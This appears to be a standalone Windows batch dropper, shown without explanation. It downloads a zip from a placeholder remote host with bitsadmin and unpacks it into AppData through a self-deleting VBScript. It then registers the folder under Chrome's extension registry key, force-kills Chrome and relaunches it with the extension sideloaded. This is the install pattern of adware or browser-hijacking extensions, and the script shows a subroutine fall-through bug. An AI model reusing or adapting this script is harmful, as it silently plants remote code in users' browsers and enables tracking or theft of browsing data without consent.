@echo off

setlocal
cd /d %~dp0

set dwURI="http://someaddress.com/extension.zip"
set tpZIP="%temp%\extension.zip"

call :DownloadFile %dwURI% %tpZIP%
call :UnZipFile "%AppData%" %tpZIP%
del "%temp%\extension.zip"

reg add "HKCU\Software\Google\Chrome\Extensions" /v "extension_id" /d "%AppData%\extension" /f

taskkill /f /im "chrome.exe"
start chrome --load-extension="%AppData%\extension"
start "%AppData%\extension"

exit /b

:UnZipFile <ExtractTo> <newzipfile>
set vbs="%temp%\unzip.vbs"
if exist %vbs% del /f /q %vbs%
>%vbs% echo Set fso = CreateObject("Scripting.FileSystemObject")
>>%vbs% echo If Not fso.FolderExists(%1) Then
>>%vbs% echo fso.CreateFolder(%1)
>>%vbs% echo End If
>>%vbs% echo set objShell = CreateObject("Shell.Application")
>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
>>%vbs% echo Set fso = Nothing
>>%vbs% echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%

:DownloadFile <URL> <DownloadTo>
bitsadmin /transfer mydownloadjob /download /priority FOREGROUND %1 %2
cls